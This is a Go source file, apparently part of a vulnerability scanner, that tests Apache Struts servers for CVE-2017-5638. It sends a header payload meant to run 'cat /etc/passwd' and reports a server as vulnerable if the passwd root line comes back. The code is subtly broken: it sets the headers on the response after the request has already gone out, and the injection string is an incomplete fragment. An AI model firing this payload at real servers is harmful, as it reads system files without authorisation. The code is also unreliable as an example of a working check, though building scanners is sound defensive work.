package apache

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"uscan/modules/handling"

	"github.com/fatih/color"
)

// Exploit url https://www.exploit-db.com/exploits/41570
// CVE: CVE-2017-5638

func CVE_5638(url string, userAgent string) {
	req, err := http.Get(url)
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", "(#cmd='cat /etc/passwd')")

	body, bodyerr := ioutil.ReadAll(req.Body)
	handling.ErrCheck(err, bodyerr)

	sb := string(body)

	if strings.Contains(sb, "root:x:0:0:root:/root:/bin/bash") {
		fmt.Println(sb)
		fmt.Println("Apache Struts 2.3.5 < 2.3.31 " + color.GreenString(">> ") + "CVE-2017-5638 " + color.GreenString("Vuln"))
	} else {
		fmt.Println("Apache Struts 2.3.5 < 2.3.31 " + color.GreenString(">> ") + "CVE-2017-5638 " + color.RedString("Not vuln"))
	}

}
